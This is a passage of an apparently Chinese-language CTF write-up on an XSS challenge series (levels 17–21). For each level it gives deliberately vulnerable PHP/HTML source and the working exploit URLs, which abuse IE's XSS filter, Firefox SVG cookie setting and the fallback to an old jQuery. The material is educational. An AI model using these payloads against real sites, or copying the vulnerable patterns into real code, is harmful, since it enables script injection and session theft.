1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">http://xianzhi.aliyun.com/xss17.php?content=%27onfocus=%27alert(1)%27%20contenteditable%20tabindex=%270%27%20id=%27xss#xss</code></pre><p style="margin-bottom: 1.2em !important;">ref: https://github.com/cure53/XSSChallengeWiki/wiki/Mini-Puzzle-1-on-kcal.pw</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">18. Graduate</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("Content-Type:text/html;charset=utf-8");
+header("X-Content-Type-Options: nosniff");
+header("X-FRAME-OPTIONS: DENY");
+header("X-XSS-Protection: 1");
+?&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=utf-8&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;textarea&gt;
+&lt;?php
+//Fix#001
+$input=str_replace("&lt;script&gt;","",$_GET["input"]);
+//Fix#002
+$input=str_replace("/","\/",$input);
+echo $input;
+?&gt;
+
+&lt;/textarea&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss18.php?input=plaintext</p><p style="margin-bottom: 1.2em !important;">也是炒鸡好的题目，输入点在<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">textarea</code>里面，在不能闭合的情况下搞事情</p><p style="margin-bottom: 1.2em !important;">有一个细节就是，开启了xss保护
+在IE下，这个保护是他会把认为有害的字符过滤掉</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpgOSLQpYt4viblZnd3uT86iadXn0TKGCW6fI4scTFoGw6vmDdqsRcKcnV24OPiczTX1hFPDykeGFDiaQ/0.png" class="" data-ratio="0.36935483870967745" data-w="1240" data-type="png"  /></p><p style="margin-bottom: 1.2em !important;">IE exp:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">http://xianzhi.aliyun.com/xss18.php?input=%3Ctextarea%3E%3Cimg%20src=1%20on%3Cscript%3Eerror=alert(document.domain)%3E</code></pre><p style="margin-bottom: 1.2em !important;">ref: https://www.slideshare.net/codeblue_jp/xss-attacks-exploiting-xss-filter-by-masato-kinugawa-code-blue-2015</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">19. Party(未做出)</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset="utf-8"&gt;
+&lt;script&gt;
+
+function getCookie(cname) {
+ &nbsp; &nbsp;var name = cname + "=";
+ &nbsp; &nbsp;var decodedCookie = decodeURIComponent(document.cookie);
+ &nbsp; &nbsp;var ca = decodedCookie.split(';');
+ &nbsp; &nbsp;for(var i = 0; i &lt; ca.length; i++) {
+ &nbsp; &nbsp; &nbsp; &nbsp;var c = ca[i];
+ &nbsp; &nbsp; &nbsp; &nbsp;while (c.charAt(0) == ' ') {
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;c = c.substring(1);
+ &nbsp; &nbsp; &nbsp; &nbsp;}
+ &nbsp; &nbsp; &nbsp; &nbsp;if (c.indexOf(name) == 0) {
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return c.substring(name.length, c.length);
+ &nbsp; &nbsp; &nbsp; &nbsp;}
+ &nbsp; &nbsp;}
+ &nbsp; &nbsp;return "";
+}
+
+function checkCookie() {
+ &nbsp; &nbsp;var user=getCookie("username");
+ &nbsp; &nbsp;if (user != "") {
+ &nbsp; &nbsp; &nbsp; &nbsp;document.write("欢迎, " + unescape(user));
+ &nbsp; &nbsp;} else {
+ &nbsp; &nbsp; &nbsp; &nbsp; alert("请登陆")
+ &nbsp; &nbsp;}
+}
+
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body onload="checkCookie()"&gt;
+&lt;?php echo '&lt;img name="avatar" src="'.str_replace('"',"&amp;quot;",$_GET["link"]).'" width="30" height="40"&gt;';?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss19.php?link=http://up.qqjia.com/z/face01/face06/facejunyong/junyong02.jpg</p><p style="margin-bottom: 1.2em !important;">FF exp:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">http://xianzhi.aliyun.com/xss19.php?link=data:image%2fsvg%2bxml,%3Cmeta%20xmlns=%27http://www.w3.org/1999/xhtml%27%20http-equiv=%27Set-Cookie%27%20content=%27username=%25%32%35%33%43script%25%32%35%33%65alert%25%32%35%32%381%25%32%35%32%39%25%32%35%33%43%25%32%35%32%66script%25%32%35%33%65%27%20/%3E</code></pre><p style="margin-bottom: 1.2em !important;">ref: http://insert-script.blogspot.jp/2016/12/firefox-svg-cross-domain-cookie.html</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">20. The End(未做出)</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("Content-Type:text/html;charset=utf-8");
+header("X-Content-Type-Options: nosniff");
+header("X-FRAME-OPTIONS: DENY");
+header("X-XSS-Protection: 0");
+
+$hookid=str_replace("=","",htmlspecialchars($_GET["hookid"]));
+$hookid=str_replace(")","",$hookid);
+$hookid=str_replace("(","",$hookid);
+$hookid=str_replace("`","",$hookid);
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset="utf-8"&gt;
+&lt;script&gt;
+hookid='&lt;?php echo $hookid;?&gt;';
+&lt;/script&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss20.php?hookid=9527</p><p style="margin-bottom: 1.2em !important;">IE exp</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">http://xianzhi.aliyun.com/xss20.php?hookid='%2b{valueOf:location, toString:[].join,0:'javascript:alert%25281%2529',length:1}%2b'</code></pre><p style="margin-bottom: 1.2em !important;">ref: https://twitter.com/xssvector/status/213631832053395456</p><p style="margin-bottom: 1.2em !important;"><strong><span style="color: rgb(234, 34, 0);">另外膜一下一血大佬用Safari的0day做出来了.</span></strong></p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">21. 番外番 jquery</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("Content-Type:text/html;charset=utf-8");
+header("X-Content-Type-Options: nosniff");
+header("X-FRAME-OPTIONS: DENY");
+header("X-XSS-Protection: 0");
+?&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset="utf-8"&gt;
+&lt;script src="https://code.jquery.com/jquery-3.2.1.js" integrity="sha256-DZAnKJ/6XZ9si04Hgrsxu/8s717jcIzLy3oi35EouyE=" crossorigin="anonymous"&gt;&lt;/script&gt;
+&lt;script&gt;
+window.jQuery || document.write('&lt;script src="http://xianzhi.aliyun.com/jquery.js"&gt;&lt;\/script&gt;');
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;
+ &nbsp; &nbsp;$(function(){
+ &nbsp; &nbsp; &nbsp; &nbsp;try { $(location.hash) } catch(e) {}
+ &nbsp; &nbsp;})
+
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss21.php</p><p style="margin-bottom: 1.2em !important;">juqery高版本不适合一些低版本的浏览器，或者意外因素(中国网络环境)，cdn的jqeury可能会加载失败，这时候就需要加载一下本地的jquery，本地加载的jquery版本为<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">1.6.1</code>是存在漏洞</p><p style="margin-bottom: 1.2em !important;">但是网络环境不可控，为了稳定的让受害者加载带有漏洞的jquery，那么一定要<span style="color: rgb(0, 0, 0);"><strong>让cdn的jquery加载失败</strong></span>～</p><p style="margin-bottom: 1.2em !important;">只要请求远程cdn时有某个header，比如说referrer，超出了cdn服务器所能接受的范围，就会产生拒绝请求的现象，比如很长串的字符.</p><p style="margin-bottom: 1.2em !important;">chrome Exp:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">http://xianzhi.aliyun.com/xss21.php?a=a....(中间省略9000个a)#&lt;img src=1 onerror=alert(0)&gt;</code></pre><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpgOSLQpYt4viblZnd3uT86iaOHDTlhyTLDiaIPicjjh7ncls6tIay24IYVAx4OEflLoBItLiaVTIPwDiaA/0.png" class="" data-ratio="0.15161290322580645" data-w="1240" data-type="png"  /></p><p style="margin-bottom: 1.2em !important;">另外就是踩的一些坑</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">FF测试不成功，应该它对location.hash的操作，比如&lt;还会url编码safai，空格会自动%20编码另外&lt;svg/onload=alert(1)&gt;操作不会成功，因为网页是已经加载好了</code></pre><section class="" data-tools="135编辑器" data-id="86357" style="max-width: 100%; box-sizing: border-box; color: rgb(62, 62, 62); font-size: 16px; white-space: normal; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: 微软雅黑; border-width: 0px; border-style: none; border-color: initial; word-wrap: break-word !important;"><section style="max-width: 100%; text-align: center; box-sizing: border-box !important; word-wrap: break-word !important;"><section style="display: inline-block; max-width: 100%; width: 192px; box-sizing: border-box !important; word-wrap: break-word !important;"><section class="" data-tools="135编辑器" data-id="86357" style="max-width: 100%; box-sizing: border-box; border-width: 0px; border-style: none; border-color: initial; word-wrap: break-word !important;"><section style="max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;"><p style="display: inline-block; max-width: 100%; width: 192px; box-sizing: border-box !important; word-wrap: break-word !important;"><br  /></p></section><section style="max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;"><p style="display: inline-block; max-width: 100%; width: 192px; box-sizing: border-box !important; word-wrap: break-word !important;"><img class="" data-ratio="0.125" data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZmbX5NFgic65Bo4SIYUK4ib9ibvpyoaPJibpkS2Q8Q24DicBfEtnh6xBcFSw/640.png?" data-type="png" data-w="600" style="display: inline; box-sizing: border-box !important; word-wrap: break-word !important; visibility: visible !important; width: 192px !important;" title="墨迹晕染分割线" width="192px"  /></p></section></section></section></section></section><p style="max-width: 100%; min-height: 1em; color: rgb(62, 62, 62); font-size: 16px; white-space: normal; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: 微软雅黑; box-sizing: border-box !important; word-wrap: break-word !important;"><br style="max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;"  /></p><p style="max-width: 100%; min-height: 1em; color: rgb(62, 62, 62); font-size: 16px; white-space: normal; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: 微软雅黑; box-sizing: border-box !important; word-wrap: break-word !important;"><img class="" data-ratio="0.3036773428232503" data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZ0Y7FsbxeE68njy7pfZf9hstOTLqPHS1uljxrnicvns89MRJ7DMQowOg/640.jpeg?" data-type="jpeg" data-w="843" style="line-height: 25.6px; box-sizing: border-box !important; word-wrap: break-word !important; visibility: visible !important; width: auto !important;" width="auto"  /></p>
+                </div>
+                <script nonce="2043559309" type="text/javascript">
+                    var first_sceen__time = (+new Date());
+
+                    if ("" == 1 && document.getElementById('js_content')) {
+                        document.getElementById('js_content').addEventListener("selectstart",function(e){ e.preventDefault(); });
+                    }
+
+                    
+                    (function(){
+                        if (navigator.userAgent.indexOf("WindowsWechat") != -1){
+                            var link = document.createElement('link');
+                            var head = document.getElementsByTagName('head')[0];
+                            link.rel = 'stylesheet';
+                            link.type = 'text/css';
+                            link.href = "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/style/page/appmsg_new/winwx435ee6.css";
+                            head.appendChild(link);
+                        }
+                    })();
+                </script>
+
+                
+                <div class="ct_mpda_wrp" id="js_sponsor_ad_area" style="display:none;"></div>
+                
+                
+                <div class="read-more__area" id="js_more_read_area" style="display:none;">
+                    
+                </div>
+
+                
+                                <div class="reward_area tc reward_area_primary" id="js_preview_reward_author" style="display:none;">
+                    <div class="reward-avatar" style="display: none;" id="js_preview_reward_author_avatar">
+                        <img src="" alt="" id="js_preview_reward_author_head">
+                    </div>
+                    
+                                        <div class="reward-author" id="js_preview_reward_author_name">L3m0n@Syclover</div>
+                                        <p class="reward_tips" id="js_preview_reward_author_wording" style="display:none;"></p>
+                    <p>
+                        <a class="reward_button" id='js_preview_reward_author_link' href="##"><span id="js_preview_reward_link_text">赞赏</span></a>
+                    </p>
+                </div>
+
+                <div class="reward_qrcode_area reward_area tc" id="js_preview_reward_qrcode" style="display:none;">
+                    <p class="tips_global">长按二维码向我转账</p>
+                    <p id="js_preview_reward_ios_wording" class="reward_tips" style="display:none;"></p>
+                    <span class="reward_qrcode_img_wrp"><img class="reward_qrcode_img" src="//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_reward_qrcode.2x42f400.png"></span>
+                    <p class="tips_global">受苹果公司新规定影响，微信 iOS 版的赞赏功能被关闭，可通过二维码转账支持公众号。</p>
+                </div>
+                                
+                
+                            </div>
+                                    
+                        
+
+
+                        
+            <ul id="js_hotspot_area" class="article_extend_area"></ul>
+
+
+            
+
+            
+
+
+<div class="rich_media_tool" id="js_toobar3">
+
+        <a class="media_tool_meta meta_primary" id="js_view_source" href="##">阅读原文</a>
+        <div id="js_read_area3" class="media_tool_meta tips_global_primary meta_primary" style="display:none;">阅读 <span id="readNum3"></span></div>
+
+    <span style="display:none;" class="media_tool_meta meta_extra meta_praise" id="like_old">
+        <i class="icon_praise_gray"></i><span class="praise_num" id="likeNum_old"></span>
+    </span>
+
+    <span style="display:none;" class="media_tool_meta meta_extra meta_like" id="like3">
+        <button class="like_btn" id="js_like_btn"> 
+          <span id="js_like_wording"> 好看</span><span class="like_num" id="likeNum3"></span>
+        </button>
+    </span>
+
+    <div id="js_like_educate" style="display:none">
+        <div class="weui-mask"></div>
+        <div class="weui-dialog weui-dialog_haokan">
+        <div class="weui-dialog__hd"><strong class="weui-dialog__title" id="educate_title">已推荐到看一看</strong></div>
+        <div class="weui-dialog__bd">
+          <img class="pic_haokan" src="//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_haokan42f400.png">
+            你的朋友可以在“发现”-“看一看”看到你认为好看的文章。        </div>
+        <div class="weui-dialog__ft" id="educate_btn" style="display: none">
+          <a href="javascript:;" class="weui-dialog__btn weui-dialog__btn_default" id="js_cancel">取消</a>
+          <a href="javascript:;" class="weui-dialog__btn weui-dialog__btn_primary" id="js_confirm">推荐</a>
+        </div>
+        <div class="weui-dialog__ft" id="educate_btn2" style="display: none">
+          <a href="javascript:;" class="weui-dialog__btn weui-dialog__btn_primary" id="js_acknowledge">我知道了</a>
+        </div>
+        </div>
+    </div>
+
+    <div id="js_unlike_educate" style="display:none">
+        <div class="weui-mask"></div>
+        <div class="weui-dialog">
+        
+        <div class="weui-dialog__bd">
+            已取消，“好看”想法已同步删除        </div>
+        <div class="weui-dialog__ft">
+          <a href="javascript:;" class="weui-dialog__btn weui-dialog__btn_primary" id="js_unlike_know">知道了</a>
+        </div>
+        </div>
+    </div>
+
+    
+    </div>
+
+
+<div class="like_comment_wrp" id="js_a_like_comment" style="display: none;">
+  <div class="like_comment_inner">
+    <div class="like_comment_hd" style="display:none" id="js_like_title"></div>
+    <div class="like_comment_bd">
+      <div class="tips_global_primary like_comment_tips">
+        <i class="weui-icon-success"></i>已推荐到看一看<a href="javascript:;" class="like_comment_share_link" id="js_a_like_comment_share">和朋友分享想法</a>
+      </div>
+    </div>
+    <div class="like_comment_ft">
+      <span id="js_a_like_comment_msg" class="like_comment_msg" style="visibility:hidden">最多200字，当前共<span id="js_a_like_current_cnt"></span>字</span>
+      <button class="like_comment_btn" disabled="disabled" id="js_a_like_confirm">发送</button>
+    </div>
+  </div>
+</div>
+
+<div id="js_like_toast" style="display: none;">
+  <div class="weui-mask_transparent"></div>
+  <div class="weui-toast">
+    <i class="weui-icon-success-no-circle weui-icon_toast"></i>
+    <p class="weui-toast__content" id="js_toast_msg">已发送</p>
+  </div>
+</div>
+
+
+<div style="display: none;" id="js_b_comment_panel" class="like_comment_primary_pop">
+  <div class="like_comment_primary_wrp" id="js_b_wrp">
+    <div class="like_comment_primary_inner">
+      <div class="like_comment_primary_hd">
+        <h4 class="like_comment_primary_title">
+          朋友将在看一看看到        </h4>
+        <button id="js_b_like_confirm" class="like_comment_primary_btn">确定</button>
+      </div>
+      <div id='js_b_comment_text_first' class="like_comment_primary_bd">
+        <span class="tips_global_primary">
+          分享你的想法...        </span>
+      </div>
+    </div>
+  </div>
+  <div class="like_comment_primary_mask" id="js_mask_1"></div>
+</div>
+
+<div style="display: none;" id="js_b_comment_final">
+  <div class="like_comment_primary_wrp editing" id="js_comment_wrp">
+    <div class="like_comment_primary_inner">
+      <div class="like_comment_primary_hd">
+        <button class="like_comment_primary_cancel" id="js_b_comment_cancel">取消</button>
+        <h4 class="like_comment_primary_title"> 分享想法到看一看 </h4>
+        <button class="like_comment_primary_btn" id="js_b_comment_confirm">确定</button>
+      </div>
+      <div class="like_comment_primary_bd">
+        <textarea class="like_comment_textarea weui-textarea" placeholder="分享你的想法..." id="js_b_comment_text_second"></textarea>
+      </div>
+      <span class="like_comment_msg" id="js_b_like_comment_msg" style="visibility: hidden;">最多200字，当前共<span id="js_b_like_current_cnt"></span>字</span>
+    </div>
+  </div>
+  <div class="like_comment_primary_mask" id="js_mask_2"></div>
+</div>
+
+<div id="js_loading" style=" display: none;">
+    <div class="weui-mask_transparent"></div>
+    <div class="weui-toast">
+        <i class="weui-loading weui-icon_toast"></i>
+        <p class="weui-toast__content">发送中</p>
+    </div>
+</div>
+
+<div id="js_fail" style="display:none">
+    <div class="weui-mask"></div>
+    <div class="weui-dialog">
+    <div class="weui-dialog__bd">
+        网络异常，请稍后重试    </div>
+    <div class="weui-dialog__ft">
+      <a href="javascript:;" class="weui-dialog__btn weui-dialog__btn_primary" id="js_fail_inform">知道了</a>
+    </div>
+    </div>
+</div>
+
+
+
+                      </div>
+        </div>
+
+        <div class="rich_media_area_primary sougou" id="sg_tj" style="display:none"></div>
+
+
+        
+        <div class="rich_media_area_extra">
+          <div class="rich_media_area_extra_inner">
+              
+              <div id="js_share_appmsg">
+              </div>
+
+              
+                            <div class="mpda_bottom_container" id="js_bottom_ad_area"></div>
+                            
+              <div id="js_iframetest" style="display:none;"></div>
+                            
+              <div class="rich_media_extra rich_media_extra_discuss" id="js_cmt_container" style="display:none">
+                
+
+                
+                <div class="discuss_mod" id="js_friend_cmt_area" style="display:none">
+                  
+                  
+                  
+                </div>
+
+                                <div class="discuss_mod" id="js_cmt_area" style="display:none">
+                </div>
+                              </div>
+          </div>
+        </div>
+
+        
+        <div id="js_pc_qr_code" class="qr_code_pc_outer" style="display:none;">
+            <div class="qr_code_pc_inner">
+                <div class="qr_code_pc">
+                    <img id="js_pc_qr_code_img" class="qr_code_pc_img">
+                    <p>微信扫一扫<br>关注该公众号</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<div id="js_pc_weapp_code" class="weui-desktop-popover weui-desktop-popover_pos-up-center weui-desktop-popover_img-text" style="display: none;">
+    <div class="weui-desktop-popover__content">
+        <div class="weui-desktop-popover__desc">
+            <img id="js_pc_weapp_code_img">
+            微信扫一扫<br>使用小程序<span id="js_pc_weapp_code_des"></span>        </div>
+    </div>
+</div>
+<div id="js_minipro_dialog" style="display:none;">
+    <div class="weui-mask"></div>
+    <div class="weui-dialog">
+        <div class="weui-dialog__bd">即将打开"<span id="js_minipro_dialog_name"></span>"小程序</div>
+        <div class="weui-dialog__ft">
+            <a id="js_minipro_dialog_cancel" href="javascript:void(0);" class="weui-dialog__btn weui-dialog__btn_default">取消</a>
+            <a id="js_minipro_dialog_ok" href="javascript:void(0);" class="weui-dialog__btn weui-dialog__btn_primary">打开</a>
+        </div>
+    </div>
+</div>
+
+        
+        <script nonce="2043559309">
+    var __DEBUGINFO = {
+        debug_js : "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/debug/console42f400.js",
+        safe_js : "//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/safe/moonsafe42f400.js",
+        res_list: []
+    };
+</script>
+
+<script nonce="2043559309" type="text/javascript">
+(function() {
+	var totalCount = 0,
+			finishCount = 0;
+
+	function _loadVConsolePlugin() {
+		window.vConsole = new window.VConsole();
+		while (window.vConsolePlugins.length > 0) {
+			var p = window.vConsolePlugins.shift();
+			window.vConsole.addPlugin(p);
+		}
+	}
+	
+	function _addVConsole(uri, cb) {
+		totalCount++;
+		var node = document.createElement('SCRIPT');
+		node.type = 'text/javascript';
+		node.src = uri;
+		node.setAttribute('nonce', '2043559309');
+		if (cb) {
+			node.onload = cb;
+		}
+		document.getElementsByTagName('head')[0].appendChild(node);
+	}
+	if (
+		(document.cookie && document.cookie.indexOf('vconsole_open=1') > -1)
+		|| location.href.indexOf('vconsole=1') > -1
+	) {
+		window.vConsolePlugins = [];
+		_addVConsole('//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/vconsole/3.2.2/vconsole.min43429b.js', function() {
+			
+			_addVConsole('//res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/vconsole/plugin/vconsole-mpopt/1.0.1/vconsole-mpopt42f400.js', _loadVConsolePlugin);
+		});
+	}
+})();
+</script>
+        
+<script nonce="2043559309" type="text/javascript">
+if (location.href.match(/fontScale=\d+/) && /(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
+
+    var m=location.href.match(/fontScale=(\d*)/);
+    var map={
+        "94":1,
+        "100":2,
+        "109":3,
+        "119":4,
+        "131":5,
+    }
+    if(m&&m[1]&&map[m[1]]){
+        document.getElementsByTagName("body")[0].className+=" appmsg_skin_fontscale_"+map[m[1]];
+        console.log("appmsg_skin_fontscale_:"+map[m[1]]);
+    }
+}
+
+
+(function(){
+    if (window.__second_open__) return; 
+
+    
+
+    var first_js_time = +new Date();
+
+    var showDate="";
+    var svrDate=new Date("1549780403"*1000);
+    var createDate=new Date("1504100903"*1000);
+    var ct="1504100903"*1;
+    var publish_time = "2017-08-30" || "";
+    var cD={
+      year:createDate.getYear(),
+      month:createDate.getMonth()+1,
+      date:createDate.getDate()
+    };
+    
+    svrDate.setHours(0);
+    svrDate.setMinutes(0);
+    svrDate.setSeconds(0);
+    var todayDate=svrDate.getTime()/1000;
+    svrDate.setDate(1);
+    svrDate.setMonth(0);
+    var yearDate=svrDate.getTime()/1000;
+    
+    if(ct>=todayDate){
+      showDate="今天";
+    
+    }else if(ct>=todayDate-60*60*24){
+       showDate="昨天";
+    
+    }else if(ct>=todayDate-2*60*60*24){
+      showDate="前天";
+    }else if(ct>=todayDate-3*60*60*24){
+      showDate="3天前";
+    }else if(ct>=todayDate-4*60*60*24){
+      showDate="4天前";
+    }else if(ct>=todayDate-5*60*60*24){
+      showDate="5天前";
+    }else if(ct>=todayDate-6*60*60*24){
+      showDate="6天前";
+    }else if(ct>=todayDate-2*7*60*60*24){
+      showDate="1周前";
+    }else if(ct>=yearDate){
+      
+      
+      
+      showDate="%s月%s日".replace("%s",cD.month).replace("%s",cD.date);
+    }else{
+      showDate=publish_time;
+    };
+    if(document.getElementById("publish_time")){
+      document.getElementById("publish_time").innerText=showDate;
+    }
+})();
+</script>
+<script nonce="2043559309" type="text/javascript">
+
+if (!window.console) window.console = { log: function() {} };
+
+if (typeof getComputedStyle == 'undefined') {
+    if (document.body.currentStyle) {
+        window.getComputedStyle = function(el) {
+            return el.currentStyle;
+        }
+    } else {
+        window.getComputedStyle = {};
+    }
+}
+(function(){
+    window.__zoom = 1;
+    
+    (function(){
+        var validArr = ","+([0.875, 1, 1.125, 1.25, 1.375]).join(",")+",";
+        var match = window.location.href.match(/winzoom=(\d+(?:\.\d+)?)/);
+        if (match && match[1]) {
+            var winzoom = parseFloat(match[1]);
+            if (validArr.indexOf(","+winzoom+",")>=0) {
+                window.__zoom = winzoom;
+            }
+        }
+    })();
+
+    var ua = navigator.userAgent.toLowerCase();
+    var re = new RegExp("msie ([0-9]+[\.0-9]*)");
+    var version;
+    if (re.exec(ua) != null) {
+        version = parseInt(RegExp.$1);
+    }
+    var isIE = false;
+    if (typeof version != 'undefined' && version >= 6 && version <= 9) {
+        isIE = true;
+    }
+    var getMaxWith=function(){
+        var container = document.getElementById('img-content');
+        var max_width = container.offsetWidth;
+        var container_padding = 0;
+        var container_style = getComputedStyle(container);
+        container_padding = parseFloat(container_style.paddingLeft) + parseFloat(container_style.paddingRight);
+        max_width -= container_padding;
+        if (!max_width) {
+            max_width = window.innerWidth - 30;      
+        }
+        return max_width;
+    };
+    var getParentWidth = function(dom){
+        var parent_width = 0;
+        var parent = dom.parentNode;
+        var outerWidth = 0;
+        while (true) {
+            if(!parent||parent.nodeType!=1) break;
+            var parent_style = getComputedStyle(parent);
+            if (!parent_style) break;
+            parent_width = parent.clientWidth - parseFloat(parent_style.paddingLeft) - parseFloat(parent_style.paddingRight) - outerWidth;
+            if (parent_width > 0) break;
+            outerWidth += parseFloat(parent_style.paddingLeft) + parseFloat(parent_style.paddingRight) + parseFloat(parent_style.marginLeft) + parseFloat(parent_style.marginRight) + parseFloat(parent_style.borderLeftWidth) + parseFloat(parent_style.borderRightWidth);
+            parent = parent.parentNode;
+        }
+        return parent_width;
+    }
+    var getOuterW=function(dom){
+        var style=getComputedStyle(dom),
+            w=0;
+        if(!!style){
